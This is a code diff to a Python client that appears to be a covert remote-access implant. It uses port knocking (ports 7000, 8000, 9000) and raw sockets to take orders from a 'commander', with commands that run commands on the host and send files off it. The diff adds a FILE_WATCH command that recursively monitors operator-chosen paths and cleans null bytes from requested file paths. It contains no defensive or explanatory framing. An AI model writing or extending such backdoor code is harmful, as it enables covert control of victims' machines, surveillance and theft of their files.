@@ -15,7 +15,8 @@ import subprocess
 from enum import IntEnum
 from collections import deque
 import threading
-from raw_socket_protocol_old import RawSocketProtocol
+from raw_socket_protocol import RawSocketProtocol
+from file_watcher import FileWatcher
 
 # Configuration
 KNOCK_SEQUENCE = [7000, 8000, 9000]  # TCP knock sequence
@@ -31,6 +32,7 @@ class CommandType(IntEnum):
     TRANSFER_TO_CLIENT   = 0x3456
     TRANSFER_FROM_CLIENT = 0x4567
     RUN_COMMAND          = 0x5678
+    FILE_WATCH = 0x6789
     ACK                  = 0x9ABC
     ERROR                = 0xABCD
 
@@ -304,7 +306,7 @@ class Client:
                 print(f"    Error saving file: {e}")
 
         elif command_type == CommandType.TRANSFER_FROM_CLIENT:
-            filepath = payload.decode('utf-8', errors='ignore').strip()
+            filepath = payload.decode('utf-8', errors='ignore').replace('\x00', '').strip()
             print(f"[*] Processing TRANSFER_FROM_CLIENT: {filepath}")
             try:
                 with open(filepath, 'rb') as f:
@@ -334,6 +336,20 @@ class Client:
                 print(f"    Error: {e}")
                 self.send_response(src_ip, CommandType.ERROR, str(e).encode())
 
+        elif command_type == CommandType.FILE_WATCH:
+            filepath = payload.decode('utf-8', errors='ignore').replace('\x00', '').strip()
+            print(f"[*] Processing FILE_WATCH: {filepath}")
+            try:
+                # with open(filepath, 'rb') as f:
+                #     content = f.read()
+                # print(f"    Sending {len(content)} bytes to commander")
+                # self.send_response(src_ip, CommandType.ACK, content)
+                watcher = FileWatcher(path=filepath,
+                                      recursive=True)
+                watcher.watch()
+            except Exception as e:
+                print(f"    Error: {e}")
+                self.send_response(src_ip, CommandType.ERROR, str(e).encode())
     # ------------------------------------------------------------------ #
     #  Response sender                                                     #
     # ------------------------------------------------------------------ #
